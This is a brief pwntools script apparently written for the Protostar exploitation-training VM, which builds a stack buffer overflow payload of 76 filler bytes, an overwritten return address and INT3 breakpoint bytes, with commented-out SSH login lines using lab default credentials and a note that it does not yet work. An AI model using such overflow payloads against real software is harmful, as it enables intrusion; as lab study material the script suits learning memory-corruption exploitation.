from pwn import *
import os
# NOT WORKING AS OF NOW
# ip = os.getenv("PROTOSTAR")
# shell = ssh('user', ip, password='user')
# sh = shell.run("sh")
# sh.sendline("cd /opt/protostar/bin/")

offset = 76
esp = 0xbffff5b0

exploit = "A"*offset + p32(esp) + "\xCC"*4
print exploit
